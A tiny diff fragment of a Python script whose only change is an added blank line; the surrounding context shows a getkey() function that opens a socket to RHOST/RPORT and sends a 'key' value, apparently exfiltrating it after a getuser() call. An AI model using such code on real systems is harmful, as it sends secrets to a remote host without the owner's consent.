@@ -36,6 +36,7 @@ def getkey():
     s.connect((RHOST, RPORT))
     s.send(key)
     s.close()
+
 getuser()
 time.sleep(3)
 getkey()
